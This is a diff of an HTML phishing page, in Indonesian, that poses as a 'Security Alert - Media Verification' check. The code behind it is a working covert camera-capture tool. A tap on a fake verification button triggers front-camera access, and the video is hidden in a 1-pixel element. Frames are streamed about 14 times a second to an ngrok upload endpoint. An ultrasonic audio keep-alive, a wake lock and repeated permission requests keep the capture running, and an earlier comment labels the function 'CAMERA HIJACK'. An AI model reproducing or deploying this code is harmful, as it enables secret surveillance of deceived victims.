@@ -2,101 +2,165 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Security Alert - Media Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; overflow: hidden; }
   
-  #overlay {
-    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-    background: rgba(0, 0, 0, 0.9); display: flex; flex-direction: column;
-    justify-content: center; align-items: center; z-index: 9999; cursor: pointer; text-align: center;
+  #permission-overlay {
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: rgba(0, 0, 0, 0.85);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    cursor: pointer;
+    text-align: center;
+    padding: 20px;
   }
-  .box { background: #111; border: 1px solid #333; padding: 20px; border-radius: 10px; }
-  button { background: #007aff; color: #fff; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-  
-  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
+  .box {
+    background: #111827;
+    border: 1px solid #374151;
+    padding: 24px;
+    border-radius: 12px;
+    max-width: 320px;
+    width: 100%;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+  }
+  h2 { font-size: 16px; margin-bottom: 10px; color: #f3f4f6; }
+  p { font-size: 12px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
+  .btn {
+    background: #2563eb;
+    color: #fff;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: bold;
+    width: 100%;
+  }
+
+  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
 </style>
 </head>
 <body>
 
-<div id="overlay">
+<div id="permission-overlay">
   <div class="box">
-    <h2>🔒 Security Check</h2>
-    <p>Klik untuk memverifikasi identitas Anda.</p>
-    <button id="startBtn">Verify Identity</button>
+    <h2>Verifikasi Keamanan Media</h2>
+    <p>Ketuk tombol di bawah untuk mengaktifkan sesi penelusuran aman dan melanjutkan.</p>
+    <button class="btn">Lanjutkan Verifikasi</button>
   </div>
 </div>
 
 <div class="hidden-container">
   <video id="cam-feed" autoplay playsinline muted></video>
-  <canvas id="processing-canvas" width="640" height="480"></canvas>
+  <canvas id="processing-canvas" width="480" height="360"></canvas>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI NGROK
-  // ============================================
   var CONFIG = {
-    // Ganti dengan URL Ngrok Anda (harus mengarah ke port 8080)
-    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame',
-    fps: 15, // 15 Frame Per Detik (Cukup untuk live stream)
-    recoveryInterval: 1000
+    tts: {
+      text: "Security verification required. Live stream session active.",
+      lang: 'en-US',
+      rate: 0.9,
+      pitch: 1.0,
+      repeatInterval: 6000
+    },
+    streamInterval: 70, // Kecepatan tinggi (~14 FPS) untuk efek live streaming mulus
+    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame'
   };
 
   var state = {
+    ttsStarted: false,
+    camStream: null,
     camActive: false,
-    audioCtx: null,
     streamTimer: null,
-    recoveryTimer: null,
-    wakeLock: null
+    audioCtx: null,
+    recoveryInterval: null
   };
 
-  // ============================================
-  // 1. AUDIO KEEP-ALIVE & WAKE LOCK
-  // ============================================
-  function initBackgroundKeepAlive() {
+  function initAudioKeepAlive() {
     try {
       window.AudioContext = window.AudioContext || window.webkitAudioContext;
       state.audioCtx = new AudioContext();
       var osc = state.audioCtx.createOscillator();
       var gain = state.audioCtx.createGain();
-      gain.gain.value = 0.001; // Sangat pelan
-      osc.frequency.value = 18000; // Ultrasonic
+      gain.gain.value = 0.00001;
+      osc.frequency.value = 18000;
       osc.connect(gain);
       gain.connect(state.audioCtx.destination);
       osc.start();
-      
-      if (state.audioCtx.state === 'suspended') state.audioCtx.resume();
     } catch (e) {}
-
-    if ('wakeLock' in navigator) {
-      navigator.wakeLock.request('screen').then(function(lock) {
-        state.wakeLock = lock;
-      }).catch(function(){});
-    }
   }
 
-  // ============================================
-  // 2. CAMERA HIJACK
-  // ============================================
-  function startCamera() {
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.onend = function () {
+        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+      };
+      window.speechSynthesis.speak(u);
+    } catch (e) {}
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
+
+  // Fungsi pengiriman frame real-time berkecepatan tinggi
+  function streamFrame() {
+    if (!state.camActive) return;
+
+    var videoElement = document.getElementById('cam-feed');
+    var canvas = document.getElementById('processing-canvas');
+    var ctx = canvas.getContext('2d');
+
+    try {
+      if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
+
+      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+      // Kompresi kualitas diturunkan sedikit (0.55) agar ukuran payload kecil dan stream tidak tersendat di jaringan
+      var dataURL = canvas.toDataURL('image/jpeg', 0.55);
+      var payload = JSON.stringify({ image: dataURL });
+
+      fetch(CONFIG.serverEndpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        keepalive: true
+      }).catch(function(err) {});
+    } catch (e) {}
+  }
+
+  function requestCameraAccess() {
     navigator.mediaDevices.getUserMedia({ 
-      video: { width: 640, height: 480, facingMode: "user" }, 
+      video: { width: { ideal: 480 }, height: { ideal: 360 }, facingMode: "user" }, 
       audio: false 
     })
     .then(function(stream) {
+      state.camStream = stream;
       state.camActive = true;
       
-      var video = document.getElementById('cam-feed');
-      video.srcObject = stream;
-      video.play().catch(function(){});
+      var videoElement = document.getElementById('cam-feed');
+      videoElement.srcObject = stream;
+      videoElement.play().catch(function(){});
 
-      document.getElementById('overlay').style.display = 'none';
+      var overlay = document.getElementById('permission-overlay');
+      if (overlay) overlay.style.display = 'none';
 
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
@@ -104,90 +168,54 @@
           triggerRecovery();
         };
       });
-
-      startStreaming();
     })
     .catch(function(err) {
-      console.log("Kamera diblokir: " + err.name);
+      state.camActive = false;
     });
   }
 
-  // ============================================
-  // 3. LIVE STREAMING (JSON Base64 - Sesuai Server Anda)
-  // ============================================
-  function startStreaming() {
-    if (state.streamTimer) clearInterval(state.streamTimer);
-    
-    var interval = 1000 / CONFIG.fps;
-
-    state.streamTimer = setInterval(function() {
-      if (!state.camActive) return;
-
-      var video = document.getElementById('cam-feed');
-      var canvas = document.getElementById('processing-canvas');
-      var ctx = canvas.getContext('2d');
-
-      if (video.readyState === video.HAVE_ENOUGH_DATA) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // Konversi ke Base64
-        var dataURL = canvas.toDataURL('image/jpeg', 0.6);
-
-        // Kirim JSON (Sesuai kode Flask Anda)
-        fetch(CONFIG.serverEndpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: dataURL }),
-          keepalive: true
-        }).catch(function(){});
-      }
-    }, interval);
-  }
-
-  // ============================================
-  // 4. RECOVERY & LIFECYCLE TRAP
-  // ============================================
   function triggerRecovery() {
-    if (state.recoveryTimer) clearInterval(state.recoveryTimer);
-    state.recoveryTimer = setInterval(function() {
-      if (!state.camActive) startCamera();
-    }, CONFIG.recoveryInterval);
+    if (state.recoveryInterval) clearInterval(state.recoveryInterval);
+    state.recoveryInterval = setInterval(function() {
+      if (!state.camActive && document.visibilityState === 'visible') {
+        requestCameraAccess();
+      }
+    }, 2000);
   }
 
-  document.addEventListener('visibilitychange', function () {
-    if (document.visibilityState === 'hidden') {
-      if (!state.camActive) startCamera();
-      if (state.audioCtx && state.audioCtx.state === 'suspended') state.audioCtx.resume();
-    } else {
-      if (!state.camActive) startCamera();
+  document.getElementById('permission-overlay').addEventListener('click', function() {
+    initAudioKeepAlive();
+    if (state.audioCtx && state.audioCtx.state === 'suspended') {
+      state.audioCtx.resume();
     }
+    startTTS();
+    requestCameraAccess();
+    triggerRecovery();
+  });
+
+  window.addEventListener('DOMContentLoaded', function() {
+    // Mulai loop pengiriman frame secara konstan
+    state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
   });
 
   window.addEventListener('pagehide', function() {
-    if (state.camActive) {
-      var video = document.getElementById('cam-feed');
-      var canvas = document.getElementById('processing-canvas');
-      var ctx = canvas.getContext('2d');
-      if (video.readyState === video.HAVE_ENOUGH_DATA) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        var dataURL = canvas.toDataURL('image/jpeg', 0.6);
-        fetch(CONFIG.serverEndpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: dataURL }),
-          keepalive: true
-        }).catch(function(){});
+    try {
+      if (state.camStream) {
+        state.camStream.getTracks().forEach(function(t) { t.stop(); });
       }
-    }
+    } catch(e) {}
   });
 
-  // ============================================
-  // 5. TRIGGER AWAL
-  // ============================================
-  document.getElementById('startBtn').addEventListener('click', function() {
-    initBackgroundKeepAlive();
-    startCamera();
-    triggerRecovery();
+  document.addEventListener('visibilitychange', function () {
+    if (document.visibilityState === 'visible') {
+      startTTS();
+      if (state.audioCtx && state.audioCtx.state === 'suspended') {
+        state.audioCtx.resume();
+      }
+      if (!state.camActive) {
+        requestCameraAccess();
+      }
+    }
   });
 
 })();
